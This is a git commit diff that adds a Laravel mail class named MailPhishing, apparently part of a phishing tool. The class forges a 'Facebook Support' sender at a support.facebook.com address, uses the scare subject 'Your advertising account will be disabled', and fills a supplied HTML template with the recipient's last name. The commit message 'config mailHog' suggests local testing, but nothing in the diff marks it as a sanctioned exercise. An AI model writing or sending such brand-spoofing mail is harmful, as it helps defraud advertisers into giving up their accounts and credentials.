dc2431e8f5c9ee162f18a1404093bd8c676eaf9c
tuanpham09 <146125035+tuanpham09@users.noreply.github.com>
2024-08-02 00:00:12 +0700

    config mailHog

---
+++ app/Mail/MailPhishing.php
@@ -0,0 +1,76 @@
+<?php
+
+namespace App\Mail;
+
+use Illuminate\Bus\Queueable;
+use Illuminate\Contracts\Queue\ShouldQueue;
+use Illuminate\Mail\Mailable;
+use Illuminate\Mail\Mailables\Content;
+use Illuminate\Mail\Mailables\Envelope;
+use Illuminate\Queue\SerializesModels;
+use Illuminate\Mail\Mailables\Address;
+
+class MailPhishing extends Mailable
+{
+    use Queueable, SerializesModels;
+
+    /**
+     * Create a new message instance.
+     *
+     * @return void
+     */
+    public $details;
+    public function __construct($details)
+    {
+        $this->details = $details;
+    }
+
+    /**
+     * Get the message envelope.
+     *
+     * @return \Illuminate\Mail\Mailables\Envelope
+     */
+    public function envelope()
+    {
+        return new Envelope(
+            from: new Address('advertise-noreply@support.facebook.com', 'Facebook Support'),
+
+            subject: 'Your advertising account will be disabled',
+        );
+    }
+
+
+    /**
+     * Get the message content definition.
+     *
+     * @return \Illuminate\Mail\Mailables\Content
+     */
+    public function content()
+    {
+        return new Content(
+            html: $this->details['template'],
+            with: [
+                'last_name' => $this->details['last_name'],
+            ],
+        );
+    }
+
+    public function build()
+    {
+        return $this->view($this->details['template'])
+            ->with([
+                'last_name' => $this->details['last_name'],
+            ]);
+    }
+
+
+    /**
+     * Get the attachments for the message.
+     *
+     * @return array
+     */
+    public function attachments()
+    {
+        return [];
+    }
+}
